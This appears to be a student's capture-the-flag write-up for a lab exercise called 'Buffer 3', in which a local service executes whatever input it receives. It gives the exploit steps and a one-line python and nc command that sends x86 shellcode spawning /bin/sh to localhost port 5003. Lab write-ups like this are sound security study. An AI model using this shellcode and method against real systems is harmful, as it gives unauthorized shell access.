ref: 2 | Buffer 3 | runner
===========================

General overview of problems faced
-------------------------------------
- Learned to write asm code to spawn a Shell. Realised I can use Shellcode found online which is way smaller than what I could ever write... Therefore I used that one.

List of vulnerabilities
--------------------
1. The user can input Shellcode as input and the program will attempt to execute the buffer which will run the Shellcode if the buffer contains Shellcode.

Steps to exploit
------------------
1. Write or find shellcode
2. Enter the shellcode into the program and it will automatically be executed.
3. You now have a shell!

Script/Command used
------------------
```
(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")'; cat ) | nc localhost 5003
```
